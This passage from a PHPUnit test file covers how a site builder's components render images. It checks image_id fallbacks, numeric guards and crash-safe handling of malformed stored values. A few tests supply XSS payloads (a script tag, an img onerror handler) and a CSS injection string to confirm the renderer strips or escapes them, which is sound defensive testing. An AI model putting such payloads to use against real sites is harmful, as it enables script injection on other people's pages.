        // still reach the renderer. The array and boolean cases are the sharp ones —
        // `(int) ['attachment_id' => 42]` and `(int) true` both evaluate to 1, so a bare
        // cast would render attachment ID 1 (usually the site's first upload) and throw
        // away the author's image_url. The is_numeric() guard at the read is what makes them
        // all mean the same thing: no attachment, fall back to image_url.
        foreach ([
            [],
            ['image_id' => 0],
            ['image_id' => 999],
            ['image_id' => 'abc'],
            ['image_id' => -5],
            ['image_id' => ['attachment_id' => 42]],
            ['image_id' => true],
        ] as $variant) {
            $html = $this->render('grid', $this->gridProps([
                'items' => [array_merge([
                    'title'     => 'Card',
                    'image_url' => 'https://example.com/fallback.jpg',
                    'image_alt' => 'A card banner',
                ], $variant)],
            ]));
            $label = json_encode($variant);
            $this->assertStringNotContainsString('srcset=', $html, "grid fallback {$label}");
            $this->assertStringContainsString(
                '<img src="https://example.com/fallback.jpg" alt="A card banner" '
                . 'class="grid__item-image" loading="lazy">',
                $html,
                "grid fallback {$label}: must emit today's single-source <img>, unchanged."
            );
        }
    }

    public function testGridItemImageIdNeverReplacesTheImageUrlGate(): void
    {
        // image_id is a COMPANION to a URL, never a substitute — the same contract logos
        // ships. An item carrying only an id renders no image wrap at all, so an author who
        // forgets image_url gets a visibly empty card rather than a silently divergent one.
        $this->seedAttachment(42, 'https://example.com/uploads/card.jpg');
        $html = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Card', 'image_id' => 42]],
        ]));
        $this->assertStringNotContainsString('grid__item-image-wrap', $html);
    }

    public function testGridStepsLayoutStillRendersNoItemImage(): void
    {
        // The steps carve-out predates this change and must survive it: routing the helper
        // must not start emitting a banner on a numbered step card.
        $this->seedAttachment(42, 'https://example.com/uploads/card.jpg');
        $html = $this->render('grid', $this->gridProps([
            'layout' => 'steps',
            'items'  => [['number' => '1', 'title' => 'Step', 'image_url' => 'a.png', 'image_id' => 42]],
        ]));
        $this->assertStringNotContainsString('grid__item-image', $html);
    }

    public function testTestimonialsAvatarImageIdRendersResponsiveMarkup(): void
    {
        $this->seedAttachment(7, 'https://example.com/uploads/jane.jpg');
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [[
                'quote'     => 'Q',
                'author'    => 'Jane Doe',
                'image_url' => 'https://example.com/fallback.jpg',
                'image_alt' => 'Jane Doe',
                'image_id'  => 7,
            ]],
        ]));
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('sizes=', $html);
        $this->assertStringContainsString('https://example.com/uploads/jane.jpg', $html);
        $this->assertStringNotContainsString('https://example.com/fallback.jpg', $html);
        $this->assertStringContainsString('class="testimonials__avatar"', $html);
        $this->assertStringContainsString('alt="Jane Doe"', $html);
        $this->assertStringContainsString('loading="lazy"', $html);
    }

    public function testTestimonialsAvatarWithoutResolvableImageIdKeepsTheSingleSourceImg(): void
    {
        // Attachment 1 is seeded on purpose: it is what a bare `(int)` cast resolves a
        // non-scalar image_id to, so if the is_numeric() guard is ever removed these
        // cases render THIS url instead of falling back, and the assertions below fail.
        $this->seedAttachment(1, 'https://example.com/uploads/FIRST-UPLOAD.jpg');
        // Every one of these is REACHABLE. #614 closed the WRITE path — a non-numeric
        // image_id is now rejected with invalid_prop_value — but the validator gates
        // writes, not storage: a composition authored before that rule still carries the
        // value, and restore_composition reports without blocking (#233), so all of these
        // still reach the renderer. The array and boolean cases are the sharp ones —
        // `(int) ['attachment_id' => 42]` and `(int) true` both evaluate to 1, so a bare
        // cast would render attachment ID 1 (usually the site's first upload) and throw
        // away the author's image_url. The is_numeric() guard at the read is what makes them
        // all mean the same thing: no attachment, fall back to image_url.
        foreach ([
            [],
            ['image_id' => 0],
            ['image_id' => 999],
            ['image_id' => 'abc'],
            ['image_id' => -5],
            ['image_id' => ['attachment_id' => 42]],
            ['image_id' => true],
        ] as $variant) {
            $html = $this->render('testimonials', $this->testimonialsProps([
                'items' => [array_merge([
                    'quote'     => 'Q',
                    'author'    => 'Jane Doe',
                    'image_url' => 'https://example.com/fallback.jpg',
                    'image_alt' => 'Jane Doe',
                ], $variant)],
            ]));
            $label = json_encode($variant);
            $this->assertStringNotContainsString('srcset=', $html, "testimonials fallback {$label}");
            $this->assertStringContainsString(
                '<img src="https://example.com/fallback.jpg" alt="Jane Doe" '
                . 'class="testimonials__avatar" loading="lazy">',
                $html,
                "testimonials fallback {$label}: must emit today's single-source <img>, unchanged."
            );
        }
    }

    public function testTestimonialsAvatarImageIdNeverReplacesTheImageUrlGate(): void
    {
        $this->seedAttachment(7, 'https://example.com/uploads/jane.jpg');
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'Jane Doe', 'image_id' => 7]],
        ]));
        $this->assertStringNotContainsString('testimonials__avatar', $html);
    }

    public function testNumericStringImageIdStillResolvesOnBothComponents(): void
    {
        // The other side of the (int) coercion: a numeric STRING must reach the responsive
        // branch, not the fallback. Same reachability argument as the reject cases above.
        $this->seedAttachment(42, 'https://example.com/uploads/card.jpg');
        $this->seedAttachment(7, 'https://example.com/uploads/jane.jpg');

        $grid = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Card', 'image_url' => 'https://example.com/fallback.jpg',
                'image_alt' => 'C', 'image_id' => '42',
            ]],
        ]));
        $this->assertStringContainsString('srcset=', $grid);
        $this->assertStringContainsString('https://example.com/uploads/card.jpg', $grid);

        $tst = $this->render('testimonials', $this->testimonialsProps([
            'items' => [[
                'quote' => 'Q', 'author' => 'Jane', 'image_url' => 'https://example.com/fallback.jpg',
                'image_alt' => 'J', 'image_id' => '7',
            ]],
        ]));
        $this->assertStringContainsString('srcset=', $tst);
        $this->assertStringContainsString('https://example.com/uploads/jane.jpg', $tst);
    }

    public function testItemImageIdIsDeclaredWithTheShippedLogosShape(): void
    {
        // "Same field shape as logos" is the whole grammar claim of A-42: no new vocabulary,
        // no new type, no new default. Compared field by field against logos rather than
        // restated, so a future edit to one of the three drifts loudly.
        $logos = json_decode(file_get_contents(dirname(__DIR__) . '/components/logos/schema.json'), true);
        $ref   = $logos['props']['items']['items']['image_id'];

        foreach (['grid', 'testimonials'] as $component) {
            $schema = json_decode(
                file_get_contents(dirname(__DIR__) . "/components/{$component}/schema.json"),
                true
            );
            $field = $schema['props']['items']['items']['image_id'] ?? null;
            $this->assertIsArray($field, "{$component}.items[] must declare image_id.");
            $this->assertSame($ref, $field, "{$component}.items[].image_id must be shape-identical to logos'.");
            // Optional, so #579's nested-required enforcement never rejects an existing item.
            $this->assertFalse((bool) ($field['required'] ?? false), "{$component}.items[].image_id must stay optional.");
        }
    }

    private function testimonialsProps(array $extra = []): array
    {
        return array_merge(['items' => [['quote' => 'Great product.']]], $extra);
    }

    public function testTestimonialsRendersQuoteAndAttribution(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [[
                'quote' => 'PromptingPress cut our build time in half.',
                'author' => 'Jane Doe',
                'role' => 'CEO',
                'company' => 'Acme Inc.',
            ]],
        ]));
        $this->assertStringContainsString('class="testimonials__quote"', $html);
        $this->assertStringContainsString('PromptingPress cut our build time in half.', $html);
        $this->assertStringContainsString('class="testimonials__author">Jane Doe<', $html);
        $this->assertStringContainsString('class="testimonials__meta">CEO, Acme Inc.<', $html);
    }

    public function testTestimonialsMetaFallsBackToRoleOnly(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'A', 'role' => 'CEO']],
        ]));
        $this->assertStringContainsString('class="testimonials__meta">CEO<', $html);
    }

    public function testTestimonialsMetaFallsBackToCompanyOnly(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'A', 'company' => 'Acme']],
        ]));
        $this->assertStringContainsString('class="testimonials__meta">Acme<', $html);
    }

    public function testTestimonialsOmitsAttributionWhenNoAuthorRoleCompanyOrImage(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Just a quote.']],
        ]));
        $this->assertStringNotContainsString('testimonials__attribution', $html);
    }

    public function testTestimonialsSkipsItemsWithoutQuote(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['author' => 'No Quote Here'], ['quote' => 'Real quote', 'author' => 'Real Author']],
        ]));
        $this->assertStringNotContainsString('No Quote Here', $html);
        $this->assertStringContainsString('Real quote', $html);
    }

    public function testTestimonialsRendersAvatarWhenImageUrlSet(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'A', 'image_url' => 'https://example.com/a.jpg', 'image_alt' => 'A photo']],
        ]));
        $this->assertStringContainsString('class="testimonials__avatar"', $html);
        $this->assertStringContainsString('alt="A photo"', $html);
    }

    public function testTestimonialsQuoteSanitizesInlineAndAttributionEscapes(): void
    {
        // #439: the quote is now an inline-HTML surface (a/strong/em/br) — dangerous
        // tags are STRIPPED (not rendered, not shown as escaped source) and the
        // allowlisted subset survives. Attribution (author/role/company) stays
        // plain-text esc_html.
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [[
                'quote' => 'Danger <script>alert(1)</script> but <em>ok</em>',
                'author' => '<img src=x onerror=alert(1)>',
                'role' => '<b>bold</b>',
            ]],
        ]));
        // Quote: script stripped, allowlisted emphasis survives, no active markup.
        $this->assertStringNotContainsString('<script', $html);
        $this->assertStringContainsString('<em>ok</em>', $html);
        // Attribution: still escaped to literal source, never active markup.
        $this->assertStringNotContainsString('<img src=x onerror=alert(1)>', $html);
        $this->assertStringContainsString('&lt;img src=x onerror=alert(1)&gt;', $html);
        $this->assertStringNotContainsString('<b>bold</b>', $html);
        $this->assertStringContainsString('&lt;b&gt;bold&lt;/b&gt;', $html);
    }

    public function testTestimonialsEmptyStateRendersWhenNoItems(): void
    {
        $html = $this->render('testimonials', ['items' => []]);
        $this->assertStringContainsString('testimonials__empty', $html);
    }

    public function testTestimonialsHeaderEyebrowSubheadingAndCenterAlignRender(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'subheading' => 'Supporting line',
            'title_align' => 'center',
        ]));
        $this->assertStringContainsString('class="testimonials__header testimonials__header--center"', $html);
        $this->assertStringContainsString('class="testimonials__eyebrow">KICKER<', $html);
        $this->assertStringContainsString('class="testimonials__heading">Heading<', $html);
        $this->assertStringContainsString('class="testimonials__subheading">Supporting line<', $html);
    }

    public function testTestimonialsHeaderOmittedWhenNoTitleEyebrowOrSubheading(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps());
        $this->assertStringNotContainsString('testimonials__header', $html);
    }

    public function testTestimonialsTitleAccentRenders(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="testimonials__heading-accent">Fast</span> and Safe', $html);
    }

    public function testTestimonialsVariantDefaultsToGrid(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps());
        $this->assertStringNotContainsString('testimonials--stack', $html);
    }

    public function testTestimonialsVariantStackAddsClass(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['layout' => 'stack']));
        $this->assertStringContainsString('class="testimonials testimonials--stack"', $html);
    }

    public function testTestimonialsInvalidVariantFallsBackToGrid(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['layout' => 'carousel']));
        $this->assertStringNotContainsString('testimonials--carousel', $html);
        $this->assertStringNotContainsString('testimonials--stack', $html);
    }

    public function testTestimonialsThemeAddsClass(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['theme' => 'inverted']));
        $this->assertStringContainsString('testimonials--inverted', $html);
    }

    public function testTestimonialsInvalidThemeFallsBackToDefault(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['theme' => 'neon']));
        $this->assertStringNotContainsString('testimonials--neon', $html);
    }

    public function testTestimonialsRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            '__pp_style' => ['--testimonials-quote-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    public function testTestimonialsSchemaDeclaresAllStyleSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/testimonials/schema.json'), true);
        $this->assertArrayHasKey('styling', $schema);
        $slots = $schema['styling']['style_slots'];
        foreach ([
            '--testimonials-padding-top', '--testimonials-padding-bottom', '--testimonials-bg',
            '--testimonials-heading-color', '--testimonials-heading-accent-color',
            '--testimonials-eyebrow-color', '--testimonials-eyebrow-bg', '--testimonials-subheading-color',
            '--testimonials-gap', '--testimonials-item-bg', '--testimonials-item-border-color',
            '--testimonials-item-border-width', '--testimonials-item-radius', '--testimonials-item-shadow',
            '--testimonials-item-padding', '--testimonials-quote-color', '--testimonials-quote-mark-color',
            '--testimonials-author-color', '--testimonials-meta-color',
        ] as $slot) {
            $this->assertArrayHasKey($slot, $slots, "testimonials must declare {$slot}.");
        }
    }

    public function testTestimonialsSchemaRequiresQuoteOnItems(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/testimonials/schema.json'), true);
        $this->assertTrue($schema['props']['items']['items']['quote']['required']);
    }

    // ── pp_render_responsive_image() + responsive image output (#107) ────────

    public function testRenderResponsiveImageFallsBackToPlainImgWithoutAttachmentId(): void
    {
        $html = pp_render_responsive_image('https://example.com/photo.jpg', 'A photo', 'hero__image', 'eager');
        $this->assertStringContainsString('<img src="https://example.com/photo.jpg"', $html);
        $this->assertStringContainsString('alt="A photo"', $html);
        $this->assertStringContainsString('class="hero__image"', $html);
        $this->assertStringContainsString('loading="eager"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testRenderResponsiveImageUsesAttachmentWhenIdResolves(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][42] = 'https://example.com/wp-content/uploads/photo.jpg';
        $html = pp_render_responsive_image('https://example.com/fallback.jpg', 'A photo', 'hero__image', 'eager', 42);
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('https://example.com/wp-content/uploads/photo.jpg', $html);
        $this->assertStringNotContainsString('fallback.jpg', $html);
    }

    public function testRenderResponsiveImageFallsBackWhenAttachmentIdUnresolvable(): void
    {
        // id 999 was never sideloaded into the test store's attachment map --
        // matches a deleted attachment or a stale/wrong id in real usage.
        $html = pp_render_responsive_image('https://example.com/fallback.jpg', 'A photo', 'hero__image', 'eager', 999);
        $this->assertStringContainsString('<img src="https://example.com/fallback.jpg"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testRenderResponsiveImageEmptyUrlAndNoIdRendersNothing(): void
    {
        $this->assertSame('', pp_render_responsive_image('', 'alt', 'class', 'lazy'));
    }

    public function testHeroSplitImageRendersPlainImgWithoutImageId(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/photo.jpg', 'image_alt' => 'Photo',
        ]));
        $this->assertStringContainsString('<img src="https://example.com/photo.jpg"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testHeroSplitImageRendersResponsivelyWithImageId(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][7] = 'https://example.com/wp-content/uploads/hero.jpg';
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/fallback.jpg', 'image_id' => 7,
        ]));
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('hero.jpg', $html);
    }

    public function testSectionImageLeftRendersResponsivelyWithImageId(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][8] = 'https://example.com/wp-content/uploads/section.jpg';
        $html = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => 'https://example.com/fallback.jpg', 'image_id' => 8,
        ]));
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('section.jpg', $html);
    }

    public function testSectionImageRightWithoutImageIdRendersPlainImg(): void
    {
        $html = $this->render('section', $this->sectionProps([
            'layout' => 'image-right', 'image_url' => 'https://example.com/photo.jpg',
        ]));
        $this->assertStringContainsString('<img src="https://example.com/photo.jpg"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    // ── #614 (gate 7A): the top-level readers join the guarded family ────────
    //
    // #584 guarded grid and testimonials items; #614 guarded logos items. hero and
    // section were scoped OUT of #614's body on the premise that "they read TOP-level
    // props, which the type pass does cover, so they are not affected" — which is
    // false in the same way the issue's own logos argument is true. The type pass
    // covers WRITES. It does not sanitise stored data, and restore_composition
    // reports without blocking (#233), so a composition written before the rule
    // reaches these readers carrying anything at all. Ratified at gate 7A; the family
    // is 5/5 now.

    public function testHeroWithoutAResolvableImageIdKeepsTheSingleSourceImg(): void
    {
        // Attachment 1 is seeded on purpose: it is what a bare `(int)` cast resolves a
        // non-scalar image_id to. Without the guard the array and boolean cases render
        // THIS url and discard the author's image_url.
        $GLOBALS['_pp_test_store']['attachment_urls'][1] = 'https://example.com/uploads/FIRST-UPLOAD.jpg';
        foreach ([
            ['image_id' => 0],
            ['image_id' => 999],
            ['image_id' => 'abc'],
            ['image_id' => ['attachment_id' => 42]],
            ['image_id' => true],
        ] as $variant) {
            $html = $this->render('hero', $this->heroProps(array_merge([
                'layout'    => 'split',
                'image_url' => 'https://example.com/authored.jpg',
                'image_alt' => 'Authored',
            ], $variant)));
            $label = json_encode($variant);
            $this->assertStringNotContainsString('srcset=', $html, "hero fallback {$label}");
            $this->assertStringNotContainsString('FIRST-UPLOAD', $html, "hero fallback {$label}");
            $this->assertStringContainsString('https://example.com/authored.jpg', $html, "hero fallback {$label}");
        }
    }

    public function testHeroLayoutNeverFlipsToSplitOnACoercedImageId(): void
    {
        // The sharper half, and the reason hero is not just "logos again":
        // hero.php derives $has_split_media from `$image_id > 0`, so a bare cast would
        // let a stored non-scalar turn a single-column hero into a two-column split
        // with no image behind it. No image_url here, so only the id could do it.
        $GLOBALS['_pp_test_store']['attachment_urls'][1] = 'https://example.com/uploads/FIRST-UPLOAD.jpg';
        foreach ([['attachment_id' => 42], true] as $bad) {
            $html = $this->render('hero', $this->heroProps([
                'layout'   => 'split',
                'image_id' => $bad,
            ]));
            $label = json_encode($bad);
            $this->assertStringNotContainsString('FIRST-UPLOAD', $html, "hero layout {$label}");
            $this->assertStringNotContainsString('hero--split', $html, "hero layout {$label}: must degrade to left");
            // Positive half, so the pin cannot pass by rendering nothing at all.
            $this->assertStringContainsString('hero--left', $html, "hero layout {$label}: degrades to left");
        }
    }

    public function testSectionWithoutAResolvableImageIdKeepsTheSingleSourceImg(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][1] = 'https://example.com/uploads/FIRST-UPLOAD.jpg';
        foreach ([
            ['image_id' => 0],
            ['image_id' => 'abc'],
            ['image_id' => ['attachment_id' => 42]],
            ['image_id' => true],
        ] as $variant) {
            $html = $this->render('section', $this->sectionProps(array_merge([
                'layout'    => 'image-left',
                'image_url' => 'https://example.com/authored.jpg',
                'image_alt' => 'Authored',
            ], $variant)));
            $label = json_encode($variant);
            $this->assertStringNotContainsString('srcset=', $html, "section fallback {$label}");
            $this->assertStringNotContainsString('FIRST-UPLOAD', $html, "section fallback {$label}");
            $this->assertStringContainsString('https://example.com/authored.jpg', $html, "section fallback {$label}");
        }
    }

    public function testHeroAndSectionNumericStringImageIdStillResolve(): void
    {
        // The accept side: a numeric STRING must still reach the responsive branch on
        // both readers, or the guard would be an over-rejection rather than a fix.
        $GLOBALS['_pp_test_store']['attachment_urls'][8] = 'https://example.com/wp-content/uploads/section.jpg';
        $GLOBALS['_pp_test_store']['attachment_urls'][9] = 'https://example.com/wp-content/uploads/hero.jpg';

        $hero = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/fallback.jpg', 'image_id' => '9',
        ]));
        $this->assertStringContainsString('srcset=', $hero);
        $this->assertStringContainsString('hero.jpg', $hero);

        $section = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => 'https://example.com/fallback.jpg', 'image_id' => '8',
        ]));
        $this->assertStringContainsString('srcset=', $section);
        $this->assertStringContainsString('section.jpg', $section);
    }

    public function testLogosItemRendersResponsivelyWithImageId(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][9] = 'https://example.com/wp-content/uploads/logo.png';
        $html = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/fallback.png', 'image_alt' => 'Logo', 'image_id' => 9]],
        ]);
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('logo.png', $html);
    }

    public function testLogosItemWithoutImageIdRendersPlainImg(): void
    {
        $html = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/logo.png', 'image_alt' => 'Logo']],
        ]);
        $this->assertStringContainsString('<img src="https://example.com/logo.png"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testLogosItemWithoutAResolvableImageIdKeepsTheSingleSourceImg(): void
    {
        // #614 takes logos to parity with grid and testimonials (#584). Attachment 1 is
        // seeded on purpose: it is what a bare `(int)` cast resolves a non-scalar
        // image_id to, so without the is_numeric() guard the array and boolean cases
        // below render THIS url and silently discard the author's image_url.
        //
        // Reachability, stated precisely now that the write path rejects these shapes:
        // the validator gates WRITES. It does not sanitise what is already stored, and
        // restore_composition reports without blocking (#233), so a composition
        // authored before the rule still reaches this renderer carrying any of them.
        $GLOBALS['_pp_test_store']['attachment_urls'][1] = 'https://example.com/uploads/FIRST-UPLOAD.png';
        foreach ([
            [],
            ['image_id' => 0],
            ['image_id' => 999],
            ['image_id' => 'abc'],
            ['image_id' => -5],
            ['image_id' => ['attachment_id' => 42]],
            ['image_id' => true],
        ] as $variant) {
            $html = $this->render('logos', [
                'items' => [array_merge([
                    'image_url' => 'https://example.com/logo.png',
                    'image_alt' => 'Logo',
                ], $variant)],
            ]);
            $label = json_encode($variant);
            $this->assertStringNotContainsString('srcset=', $html, "logos fallback {$label}");
            $this->assertStringNotContainsString('FIRST-UPLOAD', $html, "logos fallback {$label}");
            $this->assertStringContainsString(
                '<img src="https://example.com/logo.png" alt="Logo" class="logos__image" loading="lazy">',
                $html,
                "logos fallback {$label}: must emit today's single-source <img>, unchanged."
            );
        }
    }

    public function testLogosNumericStringImageIdStillResolves(): void
    {
        // The other side of the coercion: a numeric STRING must reach the responsive
        // branch, not the fallback — the guard rejects non-numerics, not non-ints.
        $GLOBALS['_pp_test_store']['attachment_urls'][9] = 'https://example.com/wp-content/uploads/logo.png';
        $html = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/fallback.png', 'image_alt' => 'Logo', 'image_id' => '9']],
        ]);
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('logo.png', $html);
    }

    public function testHeroSchemaDeclaresImageId(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $this->assertArrayHasKey('image_id', $schema['props']);
    }

    public function testSectionSchemaDeclaresImageId(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/section/schema.json'), true);
        $this->assertArrayHasKey('image_id', $schema['props']);
    }

    public function testLogosSchemaDeclaresItemImageId(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/logos/schema.json'), true);
        $this->assertArrayHasKey('image_id', $schema['props']['items']['items']);
    }

    // ── #641: a stored non-scalar image_url/image_alt must not fatal the page ─
    //
    // The image_id guards above (#584/#614) stop a bad stored value from resolving the
    // WRONG image. This is the sharper half of the same family: image_url and image_alt
    // are read with no cast and handed to TYPED parameters, so a stored ARRAY does not
    // degrade — it raises an uncatchable TypeError. templates/composition.php:25 calls
    // pp_get_component() with no try/catch, so ONE malformed stored value takes the
    // WHOLE PUBLIC PAGE down with a 500.
    //
    // WHAT THE GUARD IS, AND WHY IT IS NOT is_string(). PHP runs COERCIVE here (no
    // declare(strict_types)), so only NON-SCALARS ever fataled: a stored `42` coerced at
    // the boundary and painted `<img src="42">`. The write path is scalar-permissive to
    // match — create_page accepts `image_url: 42` and stores it raw with NO finding
    // (#707) — so an is_string() guard would silently drop a value the front door had
    // just accepted. Worse, because pp_render_responsive_image() resolves $attachment_id
    // BEFORE falling back to $url, is_string() would also discard a perfectly good
    // image_id attachment on four of the five components. The pins below are split to
    // hold both halves apart:
    //
    //   NON-SCALAR  -> "" -> no image.  CHANGED: this is the fatal, now degraded.
    //   SCALAR      -> (string) cast.   UNCHANGED: byte-identical to before the guard.
    //
    // Ratified at gate 7A. Scope is the NAMED typed call: both raw-value arguments of
    // pp_render_responsive_image(). The same defect through OTHER typed helpers is
    // tracked separately and is deliberately not fixed here — the admitting criterion was
    // same-typed-call, not same-file. Of those, #705 (background_image) and #706
    // (title/title_accent) have since LANDED with their own guards and pins; #708 remains
    // open.
    //
    // Reachability is the image_id argument exactly: the write path rejects a non-scalar
    // at both depths, but the validator gates WRITES. restore_composition reports
    // without blocking (#233), a composition authored before the rule still carries the
    // value, and a raw _pp_composition meta write is not gated at all. The end-to-end
    // pin on real stored bytes lives in tests/StoredImageUrlRenderGuardTest.php; these
    // hold the per-component shape.

    /**
     * The shapes that actually FATALED, and now degrade. Every one is a non-scalar and
     * NON-EMPTY, so it is truthy and genuinely opens the gate that reaches the typed
     * call — an empty array is falsy and never got there, so it is a control (below),
     * not a case.
     */
    public static function fatalNonScalars(): array
    {
        return [
            'import_media envelope' => [['attachment_id' => 42, 'url' => '/a.png']],
            'list'                  => [['/a.png', '/b.png']],
            'nested map'            => [['src' => ['url' => '/a.png']]],
        ];
    }

    /**
     * @dataProvider fatalNonScalars
     */
    public function testLogosStoredNonScalarImageUrlSkipsTheItemInsteadOfFataling($bad): void
    {
        // A SECOND, good item is in the band on purpose: the contract is that one
        // malformed item degrades to nothing while the rest of the page renders. Without
        // the guard this render throws and the assertions never run.
        $html = $this->render('logos', [
            'title' => 'Trusted by',
            'items' => [
                ['image_url' => $bad, 'image_alt' => 'Broken'],
                ['image_url' => 'https://example.com/good.png', 'image_alt' => 'Good'],
            ],
        ]);
        $this->assertStringNotContainsString('Broken', $html, 'the malformed item renders nothing');
        $this->assertStringContainsString(
            '<img src="https://example.com/good.png" alt="Good" class="logos__image" loading="lazy">',
            $html,
            'the sibling item is untouched'
        );
        $this->assertStringContainsString('Trusted by', $html, 'the band still renders');
        $this->assertSame(1, substr_count($html, '<img '), 'one image, not two');
    }

    /**
     * @dataProvider fatalNonScalars
     */
    public function testGridStoredNonScalarImageUrlRendersTheCardWithoutAnImage($bad): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Card title', 'text' => 'Card text', 'image_url' => $bad]],
        ]));
        $this->assertStringNotContainsString('<img ', $html, 'no image element');
        $this->assertStringNotContainsString('grid__item-image-wrap', $html, 'no image wrap');
        $this->assertStringContainsString('Card title', $html, 'the card body still renders');
        $this->assertStringContainsString('Card text', $html, 'the card body still renders');
    }

    /**
     * @dataProvider fatalNonScalars
     */
    public function testTestimonialsStoredNonScalarImageUrlRendersTheQuoteWithoutAnAvatar($bad): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'It shipped on time.', 'author' => 'Jane Doe', 'image_url' => $bad]],
        ]));
        $this->assertStringNotContainsString('<img ', $html, 'no avatar element');
        $this->assertStringNotContainsString('testimonials__avatar', $html, 'no avatar');
        $this->assertStringContainsString('It shipped on time.', $html, 'the quote renders');
        $this->assertStringContainsString('Jane Doe', $html, 'the attribution renders');
    }

    /**
     * @dataProvider fatalNonScalars
     */
    public function testHeroSplitStoredNonScalarImageUrlDegradesToLeft($bad): void
    {
        // Hero is the one that changes LAYOUT, by the shipped #440 rule: with no media
        // and no proof the second column has nothing to show, so "split" renders as
        // "left". Render-time only — the stored `layout` prop is not rewritten. No
        // image_id here, because a resolvable one is media in its own right (pinned
        // separately below).
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => $bad,
        ]));
        $this->assertStringNotContainsString('<img ', $html, 'no image element');
        $this->assertStringNotContainsString('hero--split', $html, 'degrades');
        $this->assertStringContainsString('hero--left', $html, 'degrades to left');
        $this->assertStringContainsString('>T<', $html, 'the title still renders');
    }

    /**
     * The SECOND typed helper this one prop reaches: the cover layout hands image_url to
     * pp_esc_image_src(), also `string $url`. Guarding at the READ covers it with no
     * second edit, because everything below reads the guarded local.
     *
     * @dataProvider fatalNonScalars
     */
    public function testHeroCoverStoredNonScalarImageUrlRendersWithoutABackgroundImage($bad): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'cover', 'image_url' => $bad,
        ]));
        $this->assertStringNotContainsString('background-image', $html, 'no background image');
        $this->assertStringContainsString('hero--cover', $html, 'the cover band still renders');
        $this->assertStringContainsString('hero__overlay', $html, 'the overlay still paints');
    }

    /**
     * section already falls back to text-only when there is no image URL. An array
     * defeated that gate by being truthy, so the band kept its image layout and hit the
     * typed call. With the guard the EXISTING fallback fires.
     *
     * @dataProvider fatalNonScalars
     */
    public function testSectionStoredNonScalarImageUrlDegradesToTextOnly($bad): void
    {
        foreach (['image-left', 'image-right'] as $layout) {
            $html = $this->render('section', $this->sectionProps([
                'layout' => $layout, 'image_url' => $bad,
            ]));
            $this->assertStringNotContainsString('<img ', $html, "section {$layout}: no image element");
            $this->assertStringNotContainsString('section__image-wrap', $html, "section {$layout}: no image wrap");
            $this->assertStringContainsString('<p>Body</p>', $html, "section {$layout}: the body still renders");
        }
    }

    /**
     * image_alt is argument #2 of the SAME call and fataled identically. Guarding only
     * the URL would have left the same 500 reachable one argument over in one statement,
     * which is why gate 7A admitted it: the recorded defect is the CALL, not the arg.
     *
     * Unlike image_url, image_alt's reachability is the clean one — the write path DOES
     * reject a non-scalar image_alt and the findings engine DOES report it — so this is
